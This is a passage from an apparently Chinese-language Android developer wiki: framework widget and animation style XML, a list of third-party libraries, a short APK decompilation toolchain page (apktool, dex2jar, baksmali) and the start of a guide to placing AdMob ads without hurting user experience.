        <item name="android:groupIndicator">@android:drawable/expander_group</item>
        <item name="android:indicatorLeft">?android:attr/expandableListPreferredItemIndicatorLeft</item>
        <item name="android:indicatorRight">?android:attr/expandableListPreferredItemIndicatorRight</item>
        <item name="android:childDivider">@android:drawable/divider_horizontal_dark_opaque</item>
    </style>
    <style name="Widget.ListView.White" parent="Widget.AbsListView">
        <item name="android:listSelector">@android:drawable/list_selector_background</item>
        <item name="android:cacheColorHint">?android:attr/colorBackgroundCacheHint</item>
        <item name="android:divider">@android:drawable/divider_horizontal_bright_opaque</item>
    </style>    
    <style name="Widget.ListView.DropDown">
    	<item name="android:cacheColorHint">@null</item>
        <item name="android:divider">@android:drawable/divider_horizontal_bright_opaque</item>
    </style>
    <style name="Widget.ListView.Menu" parent="Widget.Holo.ListView">
		<item name="android:cacheColorHint">@null</item>
        <item name="android:scrollbars">vertical</item>
        <item name="android:fadingEdge">none</item>
        <!-- Light background for the list in menus, so the divider for bright themes -->
        <item name="android:divider">@android:drawable/divider_horizontal_dark</item>
    </style>
```
# Checkbox
```
    <style name="Widget.CompoundButton.CheckBox">
        <item name="android:background">@android:drawable/btn_check_label_background</item>
        <item name="android:button">?android:attr/listChoiceIndicatorMultiple</item>
    </style>
```
# RadioButton
```
    <style name="Widget.CompoundButton.RadioButton">
        <item name="android:background">@android:drawable/btn_radio_label_background</item>
        <item name="android:button">?android:attr/listChoiceIndicatorSingle</item>
    </style>
```
# ScrollView
```
    <style name="Widget.ScrollView">
        <item name="android:scrollbars">vertical</item>
        <item name="android:fadingEdge">vertical</item>
    </style>
    <style name="Widget.HorizontalScrollView">
        <item name="android:scrollbars">horizontal</item>
        <item name="android:fadingEdge">horizontal</item>
    </style>
```
# ActionBar
```
  <style name="Widget.ActionBar">
        <item name="android:background">@android:drawable/action_bar_background</item>
        <item name="android:displayOptions">useLogo|showHome|showTitle</item>
        <item name="android:divider">@android:drawable/action_bar_divider</item>
        <item name="android:height">?android:attr/actionBarSize</item>
        <item name="android:paddingLeft">0dip</item>
        <item name="android:paddingTop">0dip</item>
        <item name="android:paddingRight">0dip</item>
        <item name="android:paddingBottom">0dip</item>
        <item name="android:titleTextStyle">@android:style/TextAppearance.Widget.ActionBar.Title</item>
        <item name="android:subtitleTextStyle">@android:style/TextAppearance.Widget.ActionBar.Subtitle</item>
        <item name="android:progressBarStyle">@android:style/Widget.ProgressBar.Horizontal</item>
        <item name="android:indeterminateProgressStyle">@android:style/Widget.ProgressBar.Small</item>
        <item name="android:homeLayout">@android:layout/action_bar_home</item>
    </style>
    <style name="Widget.ActionMode">
        <item name="android:background">?android:attr/actionModeBackground</item>
        <item name="android:backgroundSplit">?android:attr/actionModeSplitBackground</item>
        <item name="android:height">?android:attr/actionBarSize</item>
        <item name="android:titleTextStyle">@android:style/TextAppearance.Widget.ActionMode.Title</item>
        <item name="android:subtitleTextStyle">@android:style/TextAppearance.Widget.ActionMode.Subtitle</item>
    </style>
    <style name="TextAppearance.Widget.ActionBar.Title"
           parent="@android:style/TextAppearance.Medium">
    </style>
    <style name="TextAppearance.Widget.ActionBar.Subtitle"
           parent="@android:style/TextAppearance.Small">
    </style>
    <style name="TextAppearance.Widget.ActionMode.Title"
           parent="@android:style/TextAppearance.Medium">
    </style>
    <style name="TextAppearance.Widget.ActionMode.Subtitle"
           parent="@android:style/TextAppearance.Small">
        <item name="android:textColor">?android:attr/textColorSecondary</item>
    </style>
    <style name="Widget.ActionButton">
        <item name="android:background">?android:attr/actionBarItemBackground</item>
        <item name="android:paddingLeft">12dip</item>
        <item name="android:paddingRight">12dip</item>
        <item name="android:minWidth">56dip</item>
        <item name="android:minHeight">?android:attr/actionBarSize</item>
    </style>
    <style name="Widget.ActionButton.Overflow">
        <item name="android:src">@drawable/ic_menu_more</item>
        <item name="android:contentDescription">@string/action_menu_overflow_description</item>
    </style>
    <style name="Widget.ActionButton.CloseMode">
    </style>
    <style name="Widget.ActionBar.TabView" parent="Widget">
        <item name="android:gravity">center_horizontal</item>
        <item name="android:background">@drawable/minitab_lt</item>
        <item name="android:paddingLeft">4dip</item>
        <item name="android:paddingRight">4dip</item>
    </style>
    <style name="Widget.ActionBar.TabBar" parent="Widget">
    </style>
    <style name="Widget.ActionBar.TabText" parent="Widget">
        <item name="android:textAppearance">@style/TextAppearance.Widget.TextView.PopupMenu</item>
        <item name="android:textColor">?android:attr/textColorPrimaryInverse</item>
        <item name="android:textSize">18sp</item>
    </style>
```
# PopupWindow
```
 <style name="Widget.ListPopupWindow">
        <item name="android:dropDownSelector">@android:drawable/list_selector_background</item>
        <item name="android:popupBackground">@android:drawable/spinner_dropdown_background</item>
        <item name="android:dropDownVerticalOffset">-10dip</item>
        <item name="android:dropDownHorizontalOffset">0dip</item>
        <item name="android:dropDownWidth">wrap_content</item>        
    </style>
    <style name="Widget.PopupMenu" parent="Widget.ListPopupWindow">
    </style>
    <style name="TextAppearance.Widget.PopupMenu">
        <item name="android:textColor">@android:color/primary_text_light</item>
        <item name="android:textColorHint">@android:color/hint_foreground_light</item>
        <item name="android:textColorHighlight">@android:color/highlighted_text_light</item>
        <item name="android:textColorLink">@android:color/link_text_light</item>
    </style>
    <style name="TextAppearance.Widget.PopupMenu.Large">
        <item name="android:textSize">22sp</item>
    </style>
    <style name="TextAppearance.Widget.PopupMenu.Small">
        <item name="android:textSize">14sp</item>
        <item name="android:textColor">@android:color/secondary_text_light</item>
    </style>
```
# ProgressBar
```
    <style name="Widget.ProgressBar">
        <item name="android:indeterminateOnly">true</item>
        <item name="android:indeterminateDrawable">@android:drawable/progress_medium_white</item>
        <item name="android:indeterminateBehavior">repeat</item>
        <item name="android:indeterminateDuration">3500</item>
        <item name="android:minWidth">48dip</item>
        <item name="android:maxWidth">48dip</item>
        <item name="android:minHeight">48dip</item>
        <item name="android:maxHeight">48dip</item>
    </style>
    <style name="Widget.ProgressBar.Large">
        <item name="android:indeterminateDrawable">@android:drawable/progress_large_white</item>
        <item name="android:minWidth">76dip</item>
        <item name="android:maxWidth">76dip</item>
        <item name="android:minHeight">76dip</item>
        <item name="android:maxHeight">76dip</item>
    </style>
    
    <style name="Widget.ProgressBar.Small">
        <item name="android:indeterminateDrawable">@android:drawable/progress_small_white</item>
        <item name="android:minWidth">16dip</item>
        <item name="android:maxWidth">16dip</item>
        <item name="android:minHeight">16dip</item>
        <item name="android:maxHeight">16dip</item>
    </style>
    <style name="Widget.ProgressBar.Inverse">
        <item name="android:indeterminateDrawable">@android:drawable/progress_medium</item>
    </style>
    <style name="Widget.ProgressBar.Large.Inverse">
        <item name="android:indeterminateDrawable">@android:drawable/progress_large</item>
    </style>
    <style name="Widget.ProgressBar.Small.Inverse">
        <item name="android:indeterminateDrawable">@android:drawable/progress_small</item>
    </style> 
    
    <style name="Widget.ProgressBar.Small.Title">
        <item name="android:indeterminateDrawable">@android:drawable/progress_small_titlebar</item>
    </style>
    <style name="Widget.ProgressBar.Horizontal">
        <item name="android:indeterminateOnly">false</item>
        <item name="android:progressDrawable">@android:drawable/progress_horizontal</item>
        <item name="android:indeterminateDrawable">@android:drawable/progress_indeterminate_horizontal</item>
        <item name="android:minHeight">20dip</item>
        <item name="android:maxHeight">20dip</item>
    </style>
```
# Toggle Button
```
    <style name="Widget.Button.Toggle">
        <item name="android:background">@android:drawable/btn_toggle_bg</item>
        <item name="android:textOn">@android:string/capital_on</item>
        <item name="android:textOff">@android:string/capital_off</item>
        <item name="android:disabledAlpha">?android:attr/disabledAlpha</item>
    </style>
```
# RatingBar
```
    <style name="Widget.RatingBar">
        <item name="android:indeterminateOnly">false</item>
        <item name="android:progressDrawable">@android:drawable/ratingbar_full</item>
        <item name="android:indeterminateDrawable">@android:drawable/ratingbar_full</item>
        <item name="android:minHeight">57dip</item>
        <item name="android:maxHeight">57dip</item>
        <item name="android:thumb">@null</item>
    </style>
    <style name="Widget.RatingBar.Indicator">
        <item name="android:indeterminateOnly">false</item>
        <item name="android:progressDrawable">@android:drawable/ratingbar</item>
        <item name="android:indeterminateDrawable">@android:drawable/ratingbar</item>
        <item name="android:minHeight">38dip</item>
        <item name="android:maxHeight">38dip</item>
        <item name="android:thumb">@null</item>
        <item name="android:isIndicator">true</item>
    </style>
    <style name="Widget.RatingBar.Small">
        <item name="android:indeterminateOnly">false</item>
        <item name="android:progressDrawable">@android:drawable/ratingbar_small</item>
        <item name="android:indeterminateDrawable">@android:drawable/ratingbar_small</item>
        <item name="android:minHeight">14dip</item>
        <item name="android:maxHeight">14dip</item>
        <item name="android:thumb">@null</item>
        <item name="android:isIndicator">true</item>
    </style>
```
# CalendarView
```
    <style name="Widget.CalendarView">
        <item name="android:showWeekNumber">true</item>
        <item name="android:firstDayOfWeek">1</item>
        <item name="android:minDate">01/01/1900</item>
        <item name="android:maxDate">12/31/2100</item>
        <item name="android:shownWeekCount">6</item>
        <item name="android:selectedWeekBackgroundColor">#330099FF</item>
        <item name="android:focusedMonthDateColor">#FFFFFFFF</item>
        <item name="android:unfocusedMonthDateColor">#66FFFFFF</item>
        <item name="android:weekNumberColor">#33FFFFFF</item>
        <item name="android:weekSeparatorLineColor">#19FFFFFF</item>
        <item name="android:selectedDateVerticalBar">@android:drawable/day_picker_week_view_dayline_holo</item>
        <item name="android:weekDayTextAppearance">@android:style/TextAppearance.Small.CalendarViewWeekDayView</item>
        <item name="android:dateTextAppearance">?android:attr/textAppearanceSmall</item>
    </style>
```
# GridView
```
    <style name="Widget.GridView" parent="Widget.AbsListView">
        <item name="android:listSelector">@android:drawable/grid_selector_background</item>
    </style>
```
# WebView
```
    <style name="Widget.WebView">
        <item name="android:focusable">true</item>
        <item name="android:scrollbars">horizontal|vertical</item>
    </style>
    <style name="Widget.WebTextView">
        <item name="android:focusable">true</item>
        <item name="android:focusableInTouchMode">true</item>
        <item name="android:clickable">true</item>
        <item name="android:completionHintView">@android:layout/simple_dropdown_item_1line</item>
        <item name="android:textAppearance">?android:attr/textAppearanceLargeInverse</item>
        <item name="android:completionThreshold">2</item>
        <item name="android:dropDownSelector">@android:drawable/list_selector_background</item>
        <item name="android:popupBackground">@android:drawable/spinner_dropdown_background</item>
        <item name="textCursorDrawable">@android:drawable/text_cursor_holo_light</item>
    </style>
```
# TabWidget
```
    <style name="Widget.TabWidget">
        <item name="android:textAppearance">@style/TextAppearance.Widget.TabWidget</item>
        <item name="ellipsize">marquee</item>
        <item name="singleLine">true</item>
        <item name="android:tabStripLeft">@android:drawable/tab_bottom_left</item>
        <item name="android:tabStripRight">@android:drawable/tab_bottom_right</item>
        <item name="android:tabStripEnabled">true</item>
        <item name="android:divider">@null</item>
        <item name="android:gravity">fill_horizontal|center_vertical</item>
        <item name="android:tabLayout">@android:layout/tab_indicator</item>
    </style>
```
# Gallery
```
    <style name="Widget.Gallery">
        <item name="android:fadingEdge">none</item>
        <item name="android:gravity">center_vertical</item>
        <item name="android:spacing">-20dip</item>
        <item name="android:unselectedAlpha">0.85</item>
    </style>
```
# PopupWindow
```
    <style name="Widget.PopupWindow">
        <item name="android:popupBackground">@android:drawable/editbox_dropdown_background_dark</item>
        <item name="android:popupAnimationStyle">@android:style/Animation.PopupWindow</item>
    </style>
```
# QuickContactBadge"
```
<style name="Widget.GenericQuickContactBadge">
        <item name="android:background">@null</item>
        <item name="android:clickable">true</item>
        <item name="android:scaleType">fitCenter</item>
        <item name="android:src">@android:drawable/ic_contact_picture</item>
    </style>
    <style name="Widget.QuickContactBadge" parent="Widget.GenericQuickContactBadge">
        <item name="android:layout_width">64dip</item>
        <item name="android:layout_height">64dip</item>
    </style>
    
    <style name="Widget.QuickContactBadgeSmall" parent="Widget.GenericQuickContactBadge">
        <item name="android:layout_width">40dip</item>
        <item name="android:layout_height">40dip</item>
    </style>
    <style name="Widget.QuickContactBadge.WindowSmall">
        <item name="android:quickContactWindowSize">modeSmall</item>
    </style>
    <style name="Widget.QuickContactBadge.WindowMedium">
        <item name="android:quickContactWindowSize">modeMedium</item>
    </style>
    <style name="Widget.QuickContactBadge.WindowLarge">
        <item name="android:quickContactWindowSize">modeLarge</item>
    </style>
    
    <style name="Widget.QuickContactBadgeSmall.WindowSmall">
        <item name="android:quickContactWindowSize">modeSmall</item>
    </style>
    <style name="Widget.QuickContactBadgeSmall.WindowMedium">
        <item name="android:quickContactWindowSize">modeMedium</item>
    </style>
    <style name="Widget.QuickContactBadgeSmall.WindowLarge">
        <item name="android:quickContactWindowSize">modeLarge</item>
    </style>
```
# Switch
```
    <style name="Widget.CompoundButton.Switch">
        <item name="android:textOn">@android:string/capital_on</item>
        <item name="android:textOff">@android:string/capital_off</item>
    </style>
```
# Dialog
```
    <style name="DialogWindowTitle">
        <item name="android:maxLines">1</item>
        <item name="android:scrollHorizontally">true</item>
        <item name="android:textAppearance">@style/TextAppearance.DialogWindowTitle</item>
    </style>
    <style name="AlertDialog">
        <item name="fullDark">@android:drawable/popup_full_dark</item>
        <item name="topDark">@android:drawable/popup_top_dark</item>
        <item name="centerDark">@android:drawable/popup_center_dark</item>
        <item name="bottomDark">@android:drawable/popup_bottom_dark</item>
        <item name="fullBright">@android:drawable/popup_full_bright</item>
        <item name="topBright">@android:drawable/popup_top_bright</item>
        <item name="centerBright">@android:drawable/popup_center_bright</item>
        <item name="bottomBright">@android:drawable/popup_bottom_bright</item>
        <item name="bottomMedium">@android:drawable/popup_bottom_medium</item>
        <item name="centerMedium">@android:drawable/popup_center_medium</item>
        <item name="progressLayout">@android:layout/progress_dialog</item>
        <item name="horizontalProgressLayout">@android:layout/alert_dialog_progress</item>
    </style>
```
# Preference
```
    <style name="Widget.PreferenceFrameLayout">
        <item name="android:borderTop">0dip</item>
        <item name="android:borderBottom">0dip</item>
        <item name="android:borderLeft">0dip</item>
        <item name="android:borderRight">0dip</item>
    </style>
```
```
  <style name="Preference">
        <item name="android:layout">@android:layout/preference</item>
    </style>
    <style name="PreferenceFragment">
        <item name="android:paddingLeft">0dp</item>
        <item name="android:paddingRight">0dp</item>
    </style>
    <style name="Preference.Information">
        <item name="android:layout">@android:layout/preference_information</item>
        <item name="android:enabled">false</item>
        <item name="android:shouldDisableView">false</item>
    </style>
    
    <style name="Preference.Category">
        <item name="android:layout">@android:layout/preference_category</item>
        <!-- The title should not dim if the category is disabled, instead only the preference children should dim. -->
        <item name="android:shouldDisableView">false</item>
        <item name="android:selectable">false</item>
    </style>
    <style name="Preference.CheckBoxPreference">
        <item name="android:widgetLayout">@android:layout/preference_widget_checkbox</item>
    </style>
    <style name="Preference.SwitchPreference">
        <item name="android:widgetLayout">@android:layout/preference_widget_switch</item>
        <item name="android:switchTextOn">@android:string/capital_on</item>
        <item name="android:switchTextOff">@android:string/capital_off</item>
    </style>
    <style name="Preference.PreferenceScreen">
    </style>
    <style name="Preference.DialogPreference">
        <item name="android:positiveButtonText">@android:string/ok</item>
        <item name="android:negativeButtonText">@android:string/cancel</item>
    </style>
    <style name="Preference.DialogPreference.YesNoPreference">
        <item name="android:positiveButtonText">@android:string/yes</item>
        <item name="android:negativeButtonText">@android:string/no</item>
    </style>
    <style name="Preference.DialogPreference.EditTextPreference">
        <item name="android:dialogLayout">@android:layout/preference_dialog_edittext</item>
    </style>
    <style name="Preference.RingtonePreference">
        <item name="android:ringtoneType">ringtone</item>
        <item name="android:showSilent">true</item>
        <item name="android:showDefault">true</item>
    </style>
    <style name="Preference.Holo">
        <item name="android:layout">@android:layout/preference_holo</item>
    </style>
    <style name="PreferenceFragment.Holo">
        <item name="android:paddingLeft">@dimen/preference_fragment_padding_side</item>
        <item name="android:paddingRight">@dimen/preference_fragment_padding_side</item>
    </style>
    <style name="Preference.Holo.Information">
        <item name="android:layout">@android:layout/preference_information_holo</item>
        <item name="android:enabled">false</item>
        <item name="android:shouldDisableView">false</item>
    </style>
    <style name="Preference.Holo.Category">
        <item name="android:layout">@android:layout/preference_category_holo</item>
        <!-- The title should not dim if the category is disabled, instead only the preference children should dim. -->
        <item name="android:shouldDisableView">false</item>
        <item name="android:selectable">false</item>
    </style>
    <style name="Preference.Holo.CheckBoxPreference">
        <item name="android:widgetLayout">@android:layout/preference_widget_checkbox</item>
    </style>
    <style name="Preference.Holo.SwitchPreference">
        <item name="android:widgetLayout">@android:layout/preference_widget_switch</item>
        <item name="android:switchTextOn">@android:string/capital_on</item>
        <item name="android:switchTextOff">@android:string/capital_off</item>
    </style>
    <style name="Preference.Holo.PreferenceScreen">
    </style>
    <style name="Preference.Holo.DialogPreference">
        <item name="android:positiveButtonText">@android:string/ok</item>
        <item name="android:negativeButtonText">@android:string/cancel</item>
    </style>
    <style name="Preference.Holo.DialogPreference.YesNoPreference">
        <item name="android:positiveButtonText">@android:string/yes</item>
        <item name="android:negativeButtonText">@android:string/no</item>
    </style>
    <style name="Preference.Holo.DialogPreference.EditTextPreference">
        <item name="android:dialogLayout">@android:layout/preference_dialog_edittext</item>
    </style>
    <style name="Preference.Holo.RingtonePreference">
        <item name="android:ringtoneType">ringtone</item>
        <item name="android:showSilent">true</item>
        <item name="android:showDefault">true</item>
    </style>
    <!-- No margins or background by default. Could be different for x-large screens -->
    <style name="PreferencePanel">
    </style>
    <!-- The attributes are overridden here because the x-large or large resources may have
         changed the margins and background in the parent PreferencePanel style. -->
    <style name="PreferencePanel.Dialog">
        <item name="android:layout_marginLeft">0dip</item>
        <item name="android:layout_marginRight">0dip</item>
        <item name="android:layout_marginTop">0dip</item>
        <item name="android:layout_marginBottom">0dip</item>
        <item name="android:background">@null</item>
    </style>
```
# MediaButton
```
 <style name="MediaButton">
        <item name="android:background">@null</item>
        <item name="android:layout_width">71dip</item>
        <item name="android:layout_height">52dip</item>
    </style>
    <style name="MediaButton.Previous">
        <item name="android:src">@android:drawable/ic_media_previous</item>
    </style>
    <style name="MediaButton.Next">
        <item name="android:src">@android:drawable/ic_media_next</item>
    </style>
    <style name="MediaButton.Play">
        <item name="android:src">@android:drawable/ic_media_play</item>
    </style>
    <style name="MediaButton.Ffwd">
        <item name="android:src">@android:drawable/ic_media_ff</item>
    </style>
    <style name="MediaButton.Rew">
        <item name="android:src">@android:drawable/ic_media_rew</item>
    </style>
    <style name="MediaButton.Pause">
        <item name="android:src">@android:drawable/ic_media_pause</item>
    </style>
```
# 辅助
```
 <!-- Style you can use with a container (typically a horizontal
         LinearLayout) to get the standard "button bar" background and
         spacing. @hide -->
    <style name="ButtonBar">
        <item name="android:paddingTop">5dip</item>
        <item name="android:paddingLeft">4dip</item>
        <item name="android:paddingRight">4dip</item>
        <item name="android:paddingBottom">1dip</item>
        <item name="android:background">@android:drawable/bottom_bar</item>
    </style>
    <!-- Style you can use with a container (typically a horizontal
         LinearLayout) to get a "segmented button" background and spacing. -->
    <style name="SegmentedButton">
        <item name="android:background">@android:drawable/btn_default</item>
        <item name="android:divider">?android:attr/dividerVertical</item>
        <item name="android:showDividers">middle</item>
    </style>
    <!-- Style for the small popup windows that contain text selection anchors. -->
    <style name="Widget.TextSelectHandle">
        <item name="android:popupAnimationStyle">@android:style/Animation.TextSelectHandle</item>
    </style>
    <!-- Style for animating text selection handles. -->
    <style name="Animation.TextSelectHandle">
        <item name="windowEnterAnimation">@android:anim/fast_fade_in</item>
        <item name="windowExitAnimation">@android:anim/fast_fade_out</item>
    </style>
    <!-- Style for the popup window that contains text suggestions. -->
    <style name="Widget.TextSuggestionsPopupWindow">
        <item name="android:dropDownSelector">@android:drawable/list_selector_background</item>
        <item name="android:popupBackground">@android:drawable/text_edit_suggestions_window</item>
        <item name="android:dropDownWidth">wrap_content</item>
    </style>
```
```
    <style name="Widget.GestureOverlayView">
        <item name="android:gestureStrokeWidth">12.0</item>
        <item name="android:gestureColor">#ffffff00</item>
        <item name="android:uncertainGestureColor">#48ffff00</item>
        <item name="android:fadeOffset">420</item>
        <item name="android:fadeDuration">150</item>
        <item name="android:gestureStrokeLengthThreshold">50.0</item>
        <item name="android:gestureStrokeSquarenessThreshold">0.275</item>
        <item name="android:gestureStrokeAngleThreshold">40.0</item>
        <item name="android:eventsInterceptionEnabled">true</item>
    </style>
    <style name="Widget.GestureOverlayView.White">
        <item name="android:gestureColor">#ff00ff00</item>
        <item name="android:uncertainGestureColor">#4800ff00</item>
    </style>
```
# 动画
```
    <!-- Standard animations for a full-screen window or activity. -->
    <style name="Animation.Activity">
        <item name="activityOpenEnterAnimation">@anim/activity_open_enter</item>
        <item name="activityOpenExitAnimation">@anim/activity_open_exit</item>
        <item name="activityCloseEnterAnimation">@anim/activity_close_enter</item>
        <item name="activityCloseExitAnimation">@anim/activity_close_exit</item>
        <item name="taskOpenEnterAnimation">@anim/task_open_enter</item>
        <item name="taskOpenExitAnimation">@anim/task_open_exit</item>
        <item name="taskCloseEnterAnimation">@anim/task_close_enter</item>
        <item name="taskCloseExitAnimation">@anim/task_close_exit</item>
        <item name="taskToFrontEnterAnimation">@anim/task_open_enter</item>
        <item name="taskToFrontExitAnimation">@anim/task_open_exit</item>
        <item name="taskToBackEnterAnimation">@anim/task_close_enter</item>
        <item name="taskToBackExitAnimation">@anim/task_close_exit</item>
        <item name="wallpaperOpenEnterAnimation">@anim/wallpaper_open_enter</item>
        <item name="wallpaperOpenExitAnimation">@anim/wallpaper_open_exit</item>
        <item name="wallpaperCloseEnterAnimation">@anim/wallpaper_close_enter</item>
        <item name="wallpaperCloseExitAnimation">@anim/wallpaper_close_exit</item>
        <item name="wallpaperIntraOpenEnterAnimation">@anim/wallpaper_intra_open_enter</item>
        <item name="wallpaperIntraOpenExitAnimation">@anim/wallpaper_intra_open_exit</item>
        <item name="wallpaperIntraCloseEnterAnimation">@anim/wallpaper_intra_close_enter</item>
        <item name="wallpaperIntraCloseExitAnimation">@anim/wallpaper_intra_close_exit</item>
        <item name="fragmentOpenEnterAnimation">@animator/fragment_open_enter</item>
        <item name="fragmentOpenExitAnimation">@animator/fragment_open_exit</item>
        <item name="fragmentCloseEnterAnimation">@animator/fragment_close_enter</item>
        <item name="fragmentCloseExitAnimation">@animator/fragment_close_exit</item>
        <item name="fragmentFadeEnterAnimation">@animator/fragment_fade_enter</item>
        <item name="fragmentFadeExitAnimation">@animator/fragment_fade_exit</item>
    </style>
    <!-- Standard animations for a non-full-screen window or activity. -->
    <style name="Animation.Dialog">
        <item name="windowEnterAnimation">@anim/dialog_enter</item>
        <item name="windowExitAnimation">@anim/dialog_exit</item>
    </style>
    <!-- Standard animations for a translucent window or activity.  This
         style is <em>not<em> used by default for the translucent theme
         (since translucent activities are a special case that have no
         clear UI paradigm), but you can make your own specialized theme
         with this animation style if you would like to have the standard
         platform transition animation. -->
    <style name="Animation.Translucent">
        <item name="windowEnterAnimation">@anim/translucent_enter</item>
        <item name="windowExitAnimation">@anim/translucent_exit</item>
    </style>
    <!-- Standard animations for a non-full-screen window or activity. -->
    <style name="Animation.LockScreen">
        <item name="windowEnterAnimation">@anim/lock_screen_enter</item>
        <item name="windowExitAnimation">@anim/lock_screen_exit</item>
    </style>
    <style name="Animation.OptionsPanel">
        <item name="windowEnterAnimation">@anim/options_panel_enter</item>
        <item name="windowExitAnimation">@anim/options_panel_exit</item>
    </style>
    <style name="Animation.SubMenuPanel">
        <item name="windowEnterAnimation">@anim/submenu_enter</item>
        <item name="windowExitAnimation">@anim/submenu_exit</item>
    </style>
    <style name="Animation.TypingFilter">
        <item name="windowEnterAnimation">@anim/grow_fade_in_center</item>
        <item name="windowExitAnimation">@anim/shrink_fade_out_center</item>
    </style>
    
    <style name="Animation.TypingFilterRestore">
        <item name="windowEnterAnimation">@null</item>
        <item name="windowExitAnimation">@anim/shrink_fade_out_center</item>
    </style>
    <style name="Animation.Toast">
        <item name="windowEnterAnimation">@anim/toast_enter</item>
        <item name="windowExitAnimation">@anim/toast_exit</item>
    </style>
    <style name="Animation.DropDownDown">
        <item name="windowEnterAnimation">@anim/grow_fade_in</item>
        <item name="windowExitAnimation">@anim/shrink_fade_out</item>
    </style>
    <style name="Animation.DropDownUp">
        <item name="windowEnterAnimation">@anim/grow_fade_in_from_bottom</item>
        <item name="windowExitAnimation">@anim/shrink_fade_out_from_bottom</item>
    </style>
    <!-- Window animations that are applied to input method overlay windows. -->
    <style name="Animation.InputMethod">
        <item name="windowEnterAnimation">@anim/input_method_enter</item>
        <item name="windowExitAnimation">@anim/input_method_exit</item>
    </style>
    <!-- Special optional fancy IM animations. @hide -->
    <style name="Animation.InputMethodFancy">
        <item name="windowEnterAnimation">@anim/input_method_fancy_enter</item>
        <item name="windowExitAnimation">@anim/input_method_fancy_exit</item>
    </style>
    <!-- Window animations that are applied to the search bar overlay window.
	Previously used, but currently unused.
         {@hide Pending API council approval} -->
    <style name="Animation.SearchBar">
        <item name="windowEnterAnimation">@anim/search_bar_enter</item>
        <item name="windowExitAnimation">@anim/search_bar_exit</item>
    </style>
    <!-- Window animations that are applied to the zoom buttons overlay window. -->
    <style name="Animation.ZoomButtons">
        <item name="windowEnterAnimation">@anim/fade_in</item>
        <item name="windowExitAnimation">@anim/fade_out</item>
    </style>
    <!-- Standard animations for wallpapers. -->
    <style name="Animation.Wallpaper">
        <item name="windowEnterAnimation">@anim/wallpaper_enter</item>
        <item name="windowExitAnimation">@anim/wallpaper_exit</item>
    </style>
    <!-- A special animation we can use for recent applications,
         for devices that can support it (do alpha transformations). -->
    <style name="Animation.RecentApplications">
        <item name="windowEnterAnimation">@anim/fade_in</item>
        <item name="windowExitAnimation">@anim/fade_out</item>
    </style>
    <!-- A special animation value used internally for popup windows. -->
    <style name="Animation.PopupWindow" />
    <!-- Window animations used for action mode UI in overlay mode. -->
    <style name="Animation.PopupWindow.ActionMode">
        <item name="windowEnterAnimation">@anim/fade_in</item>
        <item name="windowExitAnimation">@anim/fade_out</item>
    </style>
    <!-- Window animations used for volume panel. -->
    <style name="Animation.VolumePanel">
        <item name="windowEnterAnimation">@null</item>
        <item name="windowExitAnimation">@anim/fade_out</item>
    </style>
```
[[TOC]]
# Android Third Part Libs
# 数据库
# !DroidCouch 
```
#!sh
$ git clone https://github.com/sig/DroidCouch.git
```
# GUI ==
# ObjectForms
 * http://www.objectforms.com/
# MrTips
MrTips is a 2-Class library that easily enbles you to display help in your Android app
 * https://github.com/lethargicpanda/mrtips.git
# 图形 
 * http://www.onbarcode.com/ 
# 消息
# Mobile Push (droidpush)
 * https://labs.ericsson.com/apis/mobile-java-push/
 
# 安全 
 * http://code.google.com/p/oauth-signpost/
# GreenGroid
 * http://android.cyrilmottier.com/?p=240
 * Blog: http://android.cyrilmottier.com/?p=240
# 多媒体 
 * Print Image: http://www.openintents.org/en/node/741
# 社交 
 * http://androidlibs.com/sociallib.html
# 其他
# XMLRCP
 * http://code.google.com/p/android-xmlrpc/
# 支付/广告
 * https://movend.com/
 * http://www.smaato.com/soma
# 蓝牙
 * http://www.sybase.com/products/allproductsa-z/mobiledevicesdks/bluetoothsdks
# 参考 ==
 * http://www.openintents.org/en/libraries
 * http://www.openintents.org/en/
[[TOC]]
# 工具链
# apktools
```sh
$ apktools d target.apk
```
# Androguard
 * http://code.google.com/p/androguard/
# dex2jar
 * http://code.google.com/p/dex2jar/
# AndBug.
# Drozer
安全测试框架 
# odex 转 jar
因为odex是平台依赖的, 所以想倒腾成dex, 进而再转成jar, 需要一下几步 
```sh
$ adb pull /system/app/Kies.odex
$ adb pull /system/framework
$ java -jar baksmali.jar -x Kies.odex -d framework/ -o Kies
$ java -jar smali.jar Kies -o Kies.dex
```
# Adding Search Functionality
# 参考 
 * http://developer.android.com/training/search/index.html
[[TOC]]
# Advertising without Compromising User Experience
如何添加不影响用户体验的广告
如何申请账号，如何添加jar包，如何把广告嵌入程序中，就略过不说了。。。
# 对于大尺寸的屏幕
考虑到不同的屏幕尺寸或横竖屏等情况，你应该考虑使用可变的广告尺寸。
例如，这段代码可以放在res/layout/ 目录下作为默认的layout设置
```xml
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/ad_catalog_layout"
        android:orientation="vertical"
        android:layout_width="match_parent"
        android:layout_height="match_parent" >
    <com.google.ads.AdView
        xmlns:googleads="http://schemas.android.com/apk/lib/com.google.ads"
        android:id="@+id/ad"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        googleads:adSize="BANNER"
        googleads:adUnitId="@string/admob_id" />
    <TextView android:id="@+id/title"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="@string/banner_top" />
    <TextView android:id="@+id/status"
        android:layout_width="match_parent"
        android:layout_height="wrap_content" />
</LinearLayout>
```
如果ad广告支持大屏幕尺寸，你可以考虑为大屏幕使用大尺寸的ad条。
下面例子展示了为大屏幕而设置的大尺寸的广告条，这个layout文件可以放置在res/layout-large/目录下
```xml
...
<com.google.ads.AdView
    xmlns:googleads="http://schemas.android.com/apk/lib/com.google.ads"
    android:id="@+id/ad"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    googleads:adSize="IAB_LEADERBOARD"
    googleads:adUnitId="@string/admob_id" />
...
```
# 广告条的放置位置
当你考虑把广告放在什么地方的时候，一定要仔细考虑用户体验。比如，你肯定不想用一堆广告塞满你的屏幕，这样会招人不待进。事实上，这种做法也是很多广告平台所禁止的。另外，也应该避免把广告放在屏幕上UI控件旁边，避免用户误点。
还有，不要让广告条挡住对用户有用的内容，
(相关贴图就不贴了)
# 配置广告
如果需要收集用户的一些数据，比如位置，统计信息什么的用以区分目标用户，那么尊重用户的隐私权是非常重要的。
要让你的用户知悉你的行为，并提供给他们退出的选择。
下面的例子，展示了使用AdMob，如何配置关键词
```java
public View onCreateView(LayoutInflater inflater, ViewGroup container,
        Bundle savedInstanceState) {
    ...
    View v = inflater.inflate(R.layout.main, container, false);
    mAdStatus = (TextView) v.findViewById(R.id.status);
    mAdView = (AdView) v.findViewById(R.id.ad);
